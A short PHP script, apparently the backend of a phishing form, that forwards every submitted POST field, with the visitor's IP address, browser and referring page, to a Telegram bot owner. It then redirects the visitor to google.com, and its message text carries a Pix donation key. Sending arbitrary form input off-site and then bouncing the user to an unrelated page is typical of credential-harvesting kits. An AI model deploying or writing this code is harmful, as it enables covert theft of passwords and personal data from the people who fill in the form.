<?php

require_once "telegram-bot-php/loader.php";

if (isset($_POST)) {
   $data=date("d/m/Y H:i:s");
   $mensagem="🆕 📝 $data:\n\n";
   
   foreach($_POST as $chave=>$valor){
      $mensagem.= $chave . ": <b>" . $valor . "</b>\n";
   }
   $mensagem.="---\nURL: " . $_SERVER['HTTP_REFERER'] . "\n";
   $mensagem.="IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
   $mensagem.="Navegador: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
   $mensagem.="---\n";
   $mensagem.="Se você gosta desse projeto considere enviar um pix:\n8d28bec9-327f-41ee-ad6b-456318c5cce1\n------------------------------------------\n";

   sm(DONO,$mensagem,false,"HTML");
   header("Location: https://www.google.com"); // URL para onde o usuário deverá ser redidecionado após o envio do formulário.

}
else {
   echo "Nenhum dado postado.";
}

?>